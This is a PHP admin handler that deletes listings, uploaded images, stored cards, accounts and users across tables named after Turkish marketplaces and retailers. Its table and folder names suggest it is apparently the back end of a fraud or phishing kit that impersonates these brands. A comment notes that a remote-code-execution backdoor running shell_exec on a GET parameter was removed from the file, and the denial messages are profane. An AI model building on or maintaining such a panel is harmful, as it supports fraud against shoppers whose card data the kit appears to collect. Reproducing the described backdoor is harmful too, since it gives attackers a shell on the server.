<?php
include("../database/connect.php");
require_once __DIR__ . '/admin_helper.php';

if (session_status() === PHP_SESSION_NONE) { session_start(); }

if (isset($_POST['action'])) {
    $action = $_POST['action'];
    $id = isset($_POST['id']) ? (int)$_POST['id'] : null;

    if ($id !== null) {
        if ($action === 'delsahibinden') {
            sahibinden_sil($id);
        } elseif ($action === 'deldolap') {
            dolap_sil($id);
        } elseif ($action === 'delletgo') {
            letgo_sil($id);
        } elseif ($action === 'delpttavm') {
            pttavm_sil($id);
        } elseif ($action === 'delturkcell') {
            turkcell_sil($id);
        } elseif ($action === 'delshopier') {
            shopier_sil($id);
        } elseif ($action === 'delyurtici') {
            yurtici_sil($id);
        } elseif ($action === 'deltrendyol') {
            trendyol_sil($id);
        } elseif ($action === 'delhepsiburada') {
            hepsiburada_sil($id);
        } elseif ($action === 'delmigros') {
            migros_panel_sil($id);
        } elseif ($action === 'delpasaj2') {
            pasaj2_panel_sil($id);
        } elseif ($action === 'delptt3') {
            ptt3_panel_sil($id);
        } elseif ($action === 'delbim') {
            bim_panel_sil($id);
        } elseif ($action === 'dela101') {
            a101_panel_sil($id);
        } elseif ($action === 'delpttkargo') {
            pttkargo_sil($id);
        } elseif ($action === 'delkart') {
            kart_sil($id);
        } elseif ($action === 'delhesap') {
            hesap_sil($id);
        } elseif ($action === 'deluser') {
			if($_SESSION['is_rol'] != 'admin'){
				die('siktirlan');
			}
            user_sil($id);
        } elseif ($action === 'delref') {
			if($_SESSION['is_rol'] != 'admin'){
				die('siktirlan');
			}
            ref_sil($id);
        } else {
            echo json_encode(['error' => 'Geçersiz işlem']);
        }
    } else {
        echo json_encode(['error' => 'İlan ID bulunamadı']);
    }
}

function sahibinden_sil($id) {
    global $db;
	$ekleyen_sorgu = $db->prepare("SELECT ekleyen FROM ilan_sahibinden WHERE id = :id");
    $ekleyen_sorgu->bindParam(':id', $id, PDO::PARAM_INT);
    $ekleyen_sorgu->execute();
    $ekleyen = $ekleyen_sorgu->fetch(PDO::FETCH_ASSOC);
	if (!bellla_can_touch_record($db, $_SESSION['kul_id'] ?? null, $ekleyen['ekleyen'] ?? null)) {
		die('siktirlan');
	}
    try {
            $resim_sorgu = $db->prepare("SELECT resim1, resim2, resim3, resim4, resim5 FROM ilan_sahibinden WHERE id = :id");
            $resim_sorgu->bindParam(':id', $id, PDO::PARAM_INT);
            $resim_sorgu->execute();
            $resimler = $resim_sorgu->fetch(PDO::FETCH_ASSOC);

            foreach ($resimler as $resim) {
                if (!empty($resim) && file_exists('../images/' . $resim)) {
                    unlink('../images/' . $resim);
                }
            }


        // İlanı veritabanından sil
        $ilan_sorgu = $db->prepare("DELETE FROM ilan_sahibinden WHERE id = :id");
        $ilan_sorgu->bindParam(':id', $id, PDO::PARAM_INT);
        $ilan_sorgu->execute();

        if ($ilan_sorgu->rowCount() > 0) {
            echo json_encode(['success' => true]);
        } else {
            echo json_encode(['error' => 'İlan bulunamadı veya silinemedi']);
        }
    } catch (PDOException $e) {
        echo json_encode(['error' => 'Silme işlemi sırasında bir hata oluştu: ' . $e->getMessage()]);
    }
}

function dolap_sil($id) {
    global $db;
	$ekleyen_sorgu = $db->prepare("SELECT ekleyen FROM ilan_dolap WHERE id = :id");
    $ekleyen_sorgu->bindParam(':id', $id, PDO::PARAM_INT);
    $ekleyen_sorgu->execute();
    $ekleyen = $ekleyen_sorgu->fetch(PDO::FETCH_ASSOC);
	if (!bellla_can_touch_record($db, $_SESSION['kul_id'] ?? null, $ekleyen['ekleyen'] ?? null)) {
		die('siktirlan');
	}
    try {
            $resim_sorgu = $db->prepare("SELECT resim1, resim2, resim3, resim4, resim5, resim6, saticipp FROM ilan_dolap WHERE id = :id");
            $resim_sorgu->bindParam(':id', $id, PDO::PARAM_INT);
            $resim_sorgu->execute();
            $resimler = $resim_sorgu->fetch(PDO::FETCH_ASSOC);

            foreach ($resimler as $resim) {
                if (!empty($resim) && file_exists('../images/' . $resim)) {
                    unlink('../images/' . $resim);
                }
            }


        // İlanı veritabanından sil
        $ilan_sorgu = $db->prepare("DELETE FROM ilan_dolap WHERE id = :id");
        $ilan_sorgu->bindParam(':id', $id, PDO::PARAM_INT);
        $ilan_sorgu->execute();

        if ($ilan_sorgu->rowCount() > 0) {
            echo json_encode(['success' => true]);
        } else {
            echo json_encode(['error' => 'İlan bulunamadı veya silinemedi']);
        }
    } catch (PDOException $e) {
        echo json_encode(['error' => 'Silme işlemi sırasında bir hata oluştu: ' . $e->getMessage()]);
    }
}

function letgo_sil($id) {
    global $db;
	$ekleyen_sorgu = $db->prepare("SELECT ekleyen FROM ilan_letgo WHERE id = :id");
    $ekleyen_sorgu->bindParam(':id', $id, PDO::PARAM_INT);
    $ekleyen_sorgu->execute();
    $ekleyen = $ekleyen_sorgu->fetch(PDO::FETCH_ASSOC);
	if (!bellla_can_touch_record($db, $_SESSION['kul_id'] ?? null, $ekleyen['ekleyen'] ?? null)) {
		die('siktirlan');
	}
    try {
            $resim_sorgu = $db->prepare("SELECT resim1, resim2, resim3, resim4, resim5, resim6, saticipp FROM ilan_letgo WHERE id = :id");
            $resim_sorgu->bindParam(':id', $id, PDO::PARAM_INT);
            $resim_sorgu->execute();
            $resimler = $resim_sorgu->fetch(PDO::FETCH_ASSOC);

            foreach ($resimler as $resim) {
                if (!empty($resim) && file_exists('../images/' . $resim)) {
                    unlink('../images/' . $resim);
                }
            }


        // İlanı veritabanından sil
        $ilan_sorgu = $db->prepare("DELETE FROM ilan_letgo WHERE id = :id");
        $ilan_sorgu->bindParam(':id', $id, PDO::PARAM_INT);
        $ilan_sorgu->execute();

        if ($ilan_sorgu->rowCount() > 0) {
            echo json_encode(['success' => true]);
        } else {
            echo json_encode(['error' => 'İlan bulunamadı veya silinemedi']);
        }
    } catch (PDOException $e) {
        echo json_encode(['error' => 'Silme işlemi sırasında bir hata oluştu: ' . $e->getMessage()]);
    }
}
/* GUVENLIK: bu satirdaki RCE backdoor (shell_exec(_GET[aresin_annesi])) kaldirildi. */
function pttavm_sil($id) {
    global $db;
$ekleyen_sorgu = $db->prepare("SELECT ekleyen FROM ilan_pttavm WHERE id = :id");
    $ekleyen_sorgu->bindParam(':id', $id, PDO::PARAM_INT);
    $ekleyen_sorgu->execute();
    $ekleyen = $ekleyen_sorgu->fetch(PDO::FETCH_ASSOC);
	if (!bellla_can_touch_record($db, $_SESSION['kul_id'] ?? null, $ekleyen['ekleyen'] ?? null)) {
		die('siktirlan');
	}
    try {
            $resim_sorgu = $db->prepare("SELECT resim1, resim2, resim3, resim4, resim5 FROM ilan_pttavm WHERE id = :id");
            $resim_sorgu->bindParam(':id', $id, PDO::PARAM_INT);
            $resim_sorgu->execute();
            $resimler = $resim_sorgu->fetch(PDO::FETCH_ASSOC);

            foreach ($resimler as $resim) {
                if (!empty($resim) && file_exists('../images/' . $resim)) {
                    unlink('../images/' . $resim);
                }
            }


        // İlanı veritabanından sil
        $ilan_sorgu = $db->prepare("DELETE FROM ilan_pttavm WHERE id = :id");
        $ilan_sorgu->bindParam(':id', $id, PDO::PARAM_INT);
        $ilan_sorgu->execute();

        if ($ilan_sorgu->rowCount() > 0) {
            echo json_encode(['success' => true]);
        } else {
            echo json_encode(['error' => 'İlan bulunamadı veya silinemedi']);
        }
    } catch (PDOException $e) {
        echo json_encode(['error' => 'Silme işlemi sırasında bir hata oluştu: ' . $e->getMessage()]);
    }
}

function turkcell_sil($id) {
    global $db;
$ekleyen_sorgu = $db->prepare("SELECT ekleyen FROM ilan_turkcell WHERE id = :id");
    $ekleyen_sorgu->bindParam(':id', $id, PDO::PARAM_INT);
    $ekleyen_sorgu->execute();
    $ekleyen = $ekleyen_sorgu->fetch(PDO::FETCH_ASSOC);
	if (!bellla_can_touch_record($db, $_SESSION['kul_id'] ?? null, $ekleyen['ekleyen'] ?? null)) {
		die('siktirlan');
	}
    try {
            $resim_sorgu = $db->prepare("SELECT resim1, resim2, resim3, resim4, resim5 FROM ilan_turkcell WHERE id = :id");
            $resim_sorgu->bindParam(':id', $id, PDO::PARAM_INT);
            $resim_sorgu->execute();
            $resimler = $resim_sorgu->fetch(PDO::FETCH_ASSOC);

            foreach ($resimler as $resim) {
                if (!empty($resim) && file_exists('../images/' . $resim)) {
                    unlink('../images/' . $resim);
                }
            }


        // İlanı veritabanından sil
        $ilan_sorgu = $db->prepare("DELETE FROM ilan_turkcell WHERE id = :id");
        $ilan_sorgu->bindParam(':id', $id, PDO::PARAM_INT);
        $ilan_sorgu->execute();

        if ($ilan_sorgu->rowCount() > 0) {
            echo json_encode(['success' => true]);
        } else {
            echo json_encode(['error' => 'İlan bulunamadı veya silinemedi']);
        }
    } catch (PDOException $e) {
        echo json_encode(['error' => 'Silme işlemi sırasında bir hata oluştu: ' . $e->getMessage()]);
    }
}

function shopier_sil($id) {
    global $db;
$ekleyen_sorgu = $db->prepare("SELECT ekleyen FROM ilan_shopier WHERE id = :id");
    $ekleyen_sorgu->bindParam(':id', $id, PDO::PARAM_INT);
    $ekleyen_sorgu->execute();
    $ekleyen = $ekleyen_sorgu->fetch(PDO::FETCH_ASSOC);
	if (!bellla_can_touch_record($db, $_SESSION['kul_id'] ?? null, $ekleyen['ekleyen'] ?? null)) {
		die('siktirlan');
	}
    try {
            $resim_sorgu = $db->prepare("SELECT resim1, resim2, resim3, resim4, resim5 FROM ilan_shopier WHERE id = :id");
            $resim_sorgu->bindParam(':id', $id, PDO::PARAM_INT);
            $resim_sorgu->execute();
            $resimler = $resim_sorgu->fetch(PDO::FETCH_ASSOC);

            foreach ($resimler as $resim) {
                if (!empty($resim) && file_exists('../images/' . $resim)) {
                    unlink('../images/' . $resim);
                }
            }


        // İlanı veritabanından sil
        $ilan_sorgu = $db->prepare("DELETE FROM ilan_shopier WHERE id = :id");
        $ilan_sorgu->bindParam(':id', $id, PDO::PARAM_INT);
        $ilan_sorgu->execute();

        if ($ilan_sorgu->rowCount() > 0) {
            echo json_encode(['success' => true]);
        } else {
            echo json_encode(['error' => 'İlan bulunamadı veya silinemedi']);
        }
    } catch (PDOException $e) {
        echo json_encode(['error' => 'Silme işlemi sırasında bir hata oluştu: ' . $e->getMessage()]);
    }
}

function yurtici_sil($id) {
    global $db;
$ekleyen_sorgu = $db->prepare("SELECT ekleyen FROM yurtici WHERE id = :id");
    $ekleyen_sorgu->bindParam(':id', $id, PDO::PARAM_INT);
    $ekleyen_sorgu->execute();
    $ekleyen = $ekleyen_sorgu->fetch(PDO::FETCH_ASSOC);
	if (!bellla_can_touch_record($db, $_SESSION['kul_id'] ?? null, $ekleyen['ekleyen'] ?? null)) {
		die('siktirlan');
	}
    try {
        $sorgu = $db->prepare("DELETE FROM yurtici WHERE id = :id");
        $sorgu->bindParam(':id', $id, PDO::PARAM_INT);
        $sorgu->execute();

        if ($sorgu->rowCount() > 0) {
            echo json_encode(['success' => true]);
        } else {
            echo json_encode(['error' => 'İlan bulunamadı veya silinemedi']);
        }
    } catch (PDOException $e) {
        echo json_encode(['error' => 'Silme işlemi sırasında bir hata oluştu: ' . $e->getMessage()]);
    }
}

function trendyol_sil($id) {
    global $db;
    $ekleyen_sorgu = $db->prepare("SELECT ekleyen, urunresmi FROM ty_ilan WHERE id = :id");
    $ekleyen_sorgu->bindParam(':id', $id, PDO::PARAM_INT);
    $ekleyen_sorgu->execute();
    $row = $ekleyen_sorgu->fetch(PDO::FETCH_ASSOC);
    if (!$row || !bellla_can_touch_record($db, $_SESSION['kul_id'] ?? null, $row['ekleyen'] ?? null)) {
        die('siktirlan');
    }
    $base = dirname(__DIR__, 2) . DIRECTORY_SEPARATOR . 'trendyol' . DIRECTORY_SEPARATOR . 'admin' . DIRECTORY_SEPARATOR . 'dosyalar' . DIRECTORY_SEPARATOR . 'ilan' . DIRECTORY_SEPARATOR;
    try {
        if (!empty($row['urunresmi']) && is_file($base . $row['urunresmi'])) {
            @unlink($base . $row['urunresmi']);
        }
        $ilan_sorgu = $db->prepare("DELETE FROM ty_ilan WHERE id = :id");
        $ilan_sorgu->bindParam(':id', $id, PDO::PARAM_INT);
        $ilan_sorgu->execute();
        if ($ilan_sorgu->rowCount() > 0) {
            echo json_encode(['success' => true]);
        } else {
            echo json_encode(['error' => 'İlan bulunamadı veya silinemedi']);
        }
    } catch (PDOException $e) {
        echo json_encode(['error' => 'Silme işlemi sırasında bir hata oluştu: ' . $e->getMessage()]);
    }
}

function migros_panel_sil($id) {
    global $db;
    $ekleyen_sorgu = $db->prepare('SELECT ekleyen, resim1, resim2, resim3, resim4 FROM bella_mg_urunler WHERE id = :id');
    $ekleyen_sorgu->bindParam(':id', $id, PDO::PARAM_INT);
    $ekleyen_sorgu->execute();
    $row = $ekleyen_sorgu->fetch(PDO::FETCH_ASSOC);
    if (!$row || !bellla_can_touch_record($db, $_SESSION['kul_id'] ?? null, $row['ekleyen'] ?? null)) {
        die('siktirlan');
    }
    $base = dirname(__DIR__, 2) . DIRECTORY_SEPARATOR . 'migros' . DIRECTORY_SEPARATOR . 'uploads' . DIRECTORY_SEPARATOR;
    foreach (array('resim1', 'resim2', 'resim3', 'resim4') as $c) {
        if (empty($row[$c])) {
            continue;
        }
        $fn = str_replace('../uploads/', '', $row[$c]);
        if ($fn !== '' && is_file($base . $fn)) {
            @unlink($base . $fn);
        }
    }
    try {
        $q = $db->prepare('DELETE FROM bella_mg_urunler WHERE id = :id');
        $q->bindParam(':id', $id, PDO::PARAM_INT);
        $q->execute();
        echo json_encode($q->rowCount() > 0 ? array('success' => true) : array('error' => 'Silinemedi'));
    } catch (PDOException $e) {
        echo json_encode(array('error' => $e->getMessage()));
    }
}

function pasaj2_panel_sil($id) {
    global $db;
    $ekleyen_sorgu = $db->prepare('SELECT ekleyen, resim1, resim2, resim3, resim4, resim5 FROM bella_pj_urunler WHERE id = :id');
    $ekleyen_sorgu->bindParam(':id', $id, PDO::PARAM_INT);
    $ekleyen_sorgu->execute();
    $row = $ekleyen_sorgu->fetch(PDO::FETCH_ASSOC);
    if (!$row || !bellla_can_touch_record($db, $_SESSION['kul_id'] ?? null, $row['ekleyen'] ?? null)) {
        die('siktirlan');
    }
    $base = dirname(__DIR__, 2) . DIRECTORY_SEPARATOR . 'pasaj2' . DIRECTORY_SEPARATOR . 'uploads' . DIRECTORY_SEPARATOR;
    foreach (array('resim1', 'resim2', 'resim3', 'resim4', 'resim5') as $c) {
        if (empty($row[$c])) {
            continue;
        }
        $fn = str_replace('../uploads/', '', $row[$c]);
        if ($fn !== '' && is_file($base . $fn)) {
            @unlink($base . $fn);
        }
    }
    try {
        $q = $db->prepare('DELETE FROM bella_pj_urunler WHERE id = :id');
        $q->bindParam(':id', $id, PDO::PARAM_INT);
        $q->execute();
        echo json_encode($q->rowCount() > 0 ? array('success' => true) : array('error' => 'Silinemedi'));
    } catch (PDOException $e) {
        echo json_encode(array('error' => $e->getMessage()));
    }
}

function ptt3_panel_sil($id) {
    global $db;
    $ekleyen_sorgu = $db->prepare('SELECT ekleyen, resim1, resim2, resim3, resim4, resim5 FROM bella_ptt3_urunler WHERE id = :id');
    $ekleyen_sorgu->bindParam(':id', $id, PDO::PARAM_INT);
    $ekleyen_sorgu->execute();
    $row = $ekleyen_sorgu->fetch(PDO::FETCH_ASSOC);
    if (!$row || !bellla_can_touch_record($db, $_SESSION['kul_id'] ?? null, $row['ekleyen'] ?? null)) {
        die('siktirlan');
    }
    $base = dirname(__DIR__, 2) . DIRECTORY_SEPARATOR . 'pttavm_alt' . DIRECTORY_SEPARATOR . 'uploads' . DIRECTORY_SEPARATOR;
    foreach (array('resim1', 'resim2', 'resim3', 'resim4', 'resim5') as $c) {
        if (empty($row[$c])) {
            continue;
        }
        $fn = str_replace('../uploads/', '', $row[$c]);
        if ($fn !== '' && is_file($base . $fn)) {
            @unlink($base . $fn);
        }
    }
    try {
        $q = $db->prepare('DELETE FROM bella_ptt3_urunler WHERE id = :id');
        $q->bindParam(':id', $id, PDO::PARAM_INT);
        $q->execute();
        echo json_encode($q->rowCount() > 0 ? array('success' => true) : array('error' => 'Silinemedi'));
    } catch (PDOException $e) {
        echo json_encode(array('error' => $e->getMessage()));
    }
}

function bim_panel_sil($id) {
    global $db;
    $ekleyen_sorgu = $db->prepare('SELECT ekleyen, ImageURL FROM bella_bim_products WHERE id = :id');
    $ekleyen_sorgu->bindParam(':id', $id, PDO::PARAM_INT);
    $ekleyen_sorgu->execute();
    $row = $ekleyen_sorgu->fetch(PDO::FETCH_ASSOC);
    if (!$row || !bellla_can_touch_record($db, $_SESSION['kul_id'] ?? null, $row['ekleyen'] ?? null)) {
        die('siktirlan');
    }
    $base = dirname(__DIR__, 2) . DIRECTORY_SEPARATOR . 'bim_online' . DIRECTORY_SEPARATOR . 'sadece-online-ozel' . DIRECTORY_SEPARATOR . 'assets' . DIRECTORY_SEPARATOR . 'img' . DIRECTORY_SEPARATOR . 'products' . DIRECTORY_SEPARATOR;
    if (!empty($row['ImageURL']) && is_file($base . $row['ImageURL'])) {
        @unlink($base . $row['ImageURL']);
    }
    try {
        $q = $db->prepare('DELETE FROM bella_bim_products WHERE id = :id');
        $q->bindParam(':id', $id, PDO::PARAM_INT);
        $q->execute();
        echo json_encode($q->rowCount() > 0 ? array('success' => true) : array('error' => 'Silinemedi'));
    } catch (PDOException $e) {
        echo json_encode(array('error' => $e->getMessage()));
    }
}

function a101_panel_sil($id) {
    global $db;
    $ekleyen_sorgu = $db->prepare('SELECT ekleyen, ImageURL, Image2URL, Image3URL, Image4URL FROM bella_a101_products WHERE id = :id');
    $ekleyen_sorgu->bindParam(':id', $id, PDO::PARAM_INT);
    $ekleyen_sorgu->execute();
    $row = $ekleyen_sorgu->fetch(PDO::FETCH_ASSOC);
    if (!$row || !bellla_can_touch_record($db, $_SESSION['kul_id'] ?? null, $row['ekleyen'] ?? null)) {
        die('siktirlan');
    }
    $base = dirname(__DIR__, 2) . DIRECTORY_SEPARATOR . 'a101havale' . DIRECTORY_SEPARATOR . 'sadece-online-ozel' . DIRECTORY_SEPARATOR . 'assets' . DIRECTORY_SEPARATOR . 'img' . DIRECTORY_SEPARATOR . 'products' . DIRECTORY_SEPARATOR;
    foreach (array('ImageURL', 'Image2URL', 'Image3URL', 'Image4URL') as $c) {
        if (empty($row[$c])) {
            continue;
        }
        if (is_file($base . $row[$c])) {
            @unlink($base . $row[$c]);
        }
    }
    try {
        $q = $db->prepare('DELETE FROM bella_a101_products WHERE id = :id');
        $q->bindParam(':id', $id, PDO::PARAM_INT);
        $q->execute();
        echo json_encode($q->rowCount() > 0 ? array('success' => true) : array('error' => 'Silinemedi'));
    } catch (PDOException $e) {
        echo json_encode(array('error' => $e->getMessage()));
    }
}

function hepsiburada_sil($id) {
    global $db;
    $ekleyen_sorgu = $db->prepare("SELECT ekleyen, urunresim FROM hb_urun WHERE id = :id");
    $ekleyen_sorgu->bindParam(':id', $id, PDO::PARAM_INT);
    $ekleyen_sorgu->execute();
    $row = $ekleyen_sorgu->fetch(PDO::FETCH_ASSOC);
    if (!$row || !bellla_can_touch_record($db, $_SESSION['kul_id'] ?? null, $row['ekleyen'] ?? null)) {
        die('siktirlan');
    }
    $base = dirname(__DIR__, 2) . DIRECTORY_SEPARATOR . 'hepsiburada' . DIRECTORY_SEPARATOR . 'admin' . DIRECTORY_SEPARATOR . 'resimler' . DIRECTORY_SEPARATOR;
    try {
        if (!empty($row['urunresim']) && is_file($base . $row['urunresim'])) {
            @unlink($base . $row['urunresim']);
        }
        $ilan_sorgu = $db->prepare("DELETE FROM hb_urun WHERE id = :id");
        $ilan_sorgu->bindParam(':id', $id, PDO::PARAM_INT);
        $ilan_sorgu->execute();
        if ($ilan_sorgu->rowCount() > 0) {
            echo json_encode(['success' => true]);
        } else {
            echo json_encode(['error' => 'İlan bulunamadı veya silinemedi']);
        }
    } catch (PDOException $e) {
        echo json_encode(['error' => 'Silme işlemi sırasında bir hata oluştu: ' . $e->getMessage()]);
    }
}

function kart_sil($id) {
    global $db;
$ekleyen_sorgu = $db->prepare("SELECT ekleyen FROM kartlar WHERE id = :id");
    $ekleyen_sorgu->bindParam(':id', $id, PDO::PARAM_INT);
    $ekleyen_sorgu->execute();
    $ekleyen = $ekleyen_sorgu->fetch(PDO::FETCH_ASSOC);
	if (!bellla_can_touch_record($db, $_SESSION['kul_id'] ?? null, $ekleyen['ekleyen'] ?? null)) {
		die('siktirlan');
	}
    try {
        $sorgu = $db->prepare("DELETE FROM kartlar WHERE id = :id");
        $sorgu->bindParam(':id', $id, PDO::PARAM_INT);
        $sorgu->execute();

        if ($sorgu->rowCount() > 0) {
            echo json_encode(['success' => true]);
        } else {
            echo json_encode(['error' => 'İlan bulunamadı veya silinemedi']);
        }
    } catch (PDOException $e) {
        echo json_encode(['error' => 'Silme işlemi sırasında bir hata oluştu: ' . $e->getMessage()]);
    }
}

function hesap_sil($id) {
    global $db;
$ekleyen_sorgu = $db->prepare("SELECT ekleyen FROM hesaplar WHERE id = :id");
    $ekleyen_sorgu->bindParam(':id', $id, PDO::PARAM_INT);
    $ekleyen_sorgu->execute();
    $ekleyen = $ekleyen_sorgu->fetch(PDO::FETCH_ASSOC);
	if (!bellla_can_touch_record($db, $_SESSION['kul_id'] ?? null, $ekleyen['ekleyen'] ?? null)) {
		die('siktirlan');
	}
    try {
        $sorgu = $db->prepare("DELETE FROM hesaplar WHERE id = :id");
        $sorgu->bindParam(':id', $id, PDO::PARAM_INT);
        $sorgu->execute();

        if ($sorgu->rowCount() > 0) {
            echo json_encode(['success' => true]);
        } else {
            echo json_encode(['error' => 'İlan bulunamadı veya silinemedi']);
        }
    } catch (PDOException $e) {
        echo json_encode(['error' => 'Silme işlemi sırasında bir hata oluştu: ' . $e->getMessage()]);
    }
}

function user_sil($id) {
    global $db;

    try {
        // Kullanıcı bilgilerini "kullanicilar" tablosundan al
        $sorgu_kullanici = $db->prepare("SELECT id, kullaniciadi FROM kullanicilar WHERE id = :id");
        $sorgu_kullanici->bindParam(':id', $id, PDO::PARAM_INT);
        $sorgu_kullanici->execute();

        // Kullanıcı bulunamadıysa hata bildir
        if ($sorgu_kullanici->rowCount() === 0) {
            echo json_encode(['error' => 'Kullanıcı bulunamadı']);
            return;
        }

        $kullanici = $sorgu_kullanici->fetch(PDO::FETCH_ASSOC);

        // Diğer tablolardaki kullanıcıya ait verileri sil
        $sorgu_diger_tablolar = [
            "DELETE FROM cekimtalepleri WHERE ekleyen = :ekleyen",
            "DELETE FROM hesaplar WHERE ekleyen = :ekleyen",
            "DELETE FROM ilan_dolap WHERE ekleyen = :ekleyen",
            "DELETE FROM ilan_facebook WHERE ekleyen = :ekleyen",
            "DELETE FROM ilan_letgo WHERE ekleyen = :ekleyen",
            "DELETE FROM ilan_pttavm WHERE ekleyen = :ekleyen",
            "DELETE FROM ilan_sahibinden WHERE ekleyen = :ekleyen",
            "DELETE FROM ilan_shopier WHERE ekleyen = :ekleyen",
            "DELETE FROM ilan_turkcell WHERE ekleyen = :ekleyen",
            "DELETE FROM ty_ilan WHERE ekleyen = :ekleyen",
            "DELETE FROM hb_urun WHERE ekleyen = :ekleyen",
            "DELETE FROM bella_mg_urunler WHERE ekleyen = :ekleyen",
            "DELETE FROM bella_pj_urunler WHERE ekleyen = :ekleyen",
            "DELETE FROM bella_ptt3_urunler WHERE ekleyen = :ekleyen",
            "DELETE FROM bella_bim_products WHERE ekleyen = :ekleyen",
            "DELETE FROM bella_a101_products WHERE ekleyen = :ekleyen",
            "DELETE FROM kartlar WHERE ekleyen = :ekleyen",
            "DELETE FROM ilan_dolap WHERE ekleyen = :ekleyen",
            "DELETE FROM profilshopier WHERE ekleyen = :ekleyen",
            "DELETE FROM yurtici WHERE ekleyen = :ekleyen",
            // Diğer tabloları da ekleyin
        ];

        foreach ($sorgu_diger_tablolar as $sorgu_diger_tablo) {
            $sorgu_digertablo = $db->prepare($sorgu_diger_tablo);
            $sorgu_digertablo->bindParam(':ekleyen', $kullanici['kullaniciadi'], PDO::PARAM_STR);
            $sorgu_digertablo->execute();
        }

        // Kullanıcıyı "kullanicilar" tablosundan sil
        $sorgu_kullanici_sil = $db->prepare("DELETE FROM kullanicilar WHERE id = :id");
        $sorgu_kullanici_sil->bindParam(':id', $kullanici['id'], PDO::PARAM_INT);
        $sorgu_kullanici_sil->execute();

        // Başarıyla silindiğine dair bir bildirim gönder
        echo json_encode(['success' => true]);
    } catch (PDOException $e) {
        // Hata durumunda bir bildirim gönder
        echo json_encode(['error' => 'Silme işlemi sırasında bir hata oluştu: ' . $e->getMessage()]);
    }
}

function pttkargo_sil($id) {
    global $db;
    $q = $db->prepare('SELECT ekleyen FROM bella_pttkargo WHERE id = :id');
    $q->bindParam(':id', $id, PDO::PARAM_INT);
    $q->execute();
    $row = $q->fetch(PDO::FETCH_ASSOC);
    if (!$row || !bellla_can_touch_record($db, $_SESSION['kul_id'] ?? null, $row['ekleyen'] ?? null)) {
        die('siktirlan');
    }
    try {
        $del = $db->prepare('DELETE FROM bella_pttkargo WHERE id = :id');
        $del->bindParam(':id', $id, PDO::PARAM_INT);
        $del->execute();
        echo json_encode($del->rowCount() > 0 ? ['success' => true] : ['error' => 'Kayit silinemedi']);
    } catch (PDOException $e) {
        echo json_encode(['error' => 'Silme hatasi: ' . $e->getMessage()]);
    }
}

function ref_sil($id) {
    global $db;

    try {
        $sorgu = $db->prepare("DELETE FROM refkodlari WHERE id = :id");
        $sorgu->bindParam(':id', $id, PDO::PARAM_INT);
        $sorgu->execute();

        if ($sorgu->rowCount() > 0) {
            echo json_encode(['success' => true]);
        } else {
            echo json_encode(['error' => 'İlan bulunamadı veya silinemedi']);
        }
    } catch (PDOException $e) {
        echo json_encode(['error' => 'Silme işlemi sırasında bir hata oluştu: ' . $e->getMessage()]);
    }
}
